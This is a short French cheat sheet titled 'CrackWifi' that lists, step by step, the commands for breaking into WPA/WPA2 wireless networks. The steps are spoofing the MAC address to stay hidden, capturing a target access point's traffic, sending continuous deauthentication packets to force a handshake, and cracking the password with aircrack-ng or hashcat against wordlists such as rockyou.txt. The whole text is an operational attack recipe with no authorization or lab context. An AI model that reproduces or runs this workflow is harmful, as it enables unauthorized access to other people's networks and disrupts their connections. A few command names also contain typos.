# CrackWifi

airodump-ng

aireplay-ng 

aircrack-ng 

hashcat

iwconfig

# desactiver carte wifi pour changer l'adresse MAC (se cacher)
ifconfig wlan0 down 

changement d'adresse MAC
macchanger –m XX:XX:XX:XX:XX:XX wlan0

# reactiver carte wifi
ifconfig wlan0 up

# passer la carte en mode monitor
iwconfig wlan0 mode monitor 
airmong-ng start wlan0

# scanner réseaux disponibles 
airodump-ng -–encrypt XX wlan0

# ecouter et desauthentifier dans 2 terminaux (tâches fait en 
airodump-ng -w hack1 -c 2 --bssid xx:xx:xx:xx:xx:xx wlan0mon
-c 2 = channel 
hack1 = les fichiers qui vont être créés
xx:xx:xx:xx:xx:xx = mac de la borne cible

# desauthentifier 
aireplay-ng --deauth 0 -a xx:xx:xx:xx:xx:xx wlan0mon
xx:xx:xx:xx:xx:xx = mac de la borne cible

# crack mot de passe
aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt....

# Bonus possible d'utiliser hashcat mais l'extension cap2hccapx est nécessaire:

present dans le paquet hashcatutils

conversion du fichier cap en hccapx pour hashcat

cap2hccapx info.cap WPA2_capture.hccapx

puis execute hashcat en spécifiant le "mask" de chiffrement et enregistrement dans un fichier dans l'exemple WPA2_resolved

hashcat -m 2500 -a 6 -O -o WPA2_resolved.txt WPA2_capture.hccapx D:\Dictionnaires\ALL\dico_1.txt D:\Dictionnaires\ALL\dico_2.txt
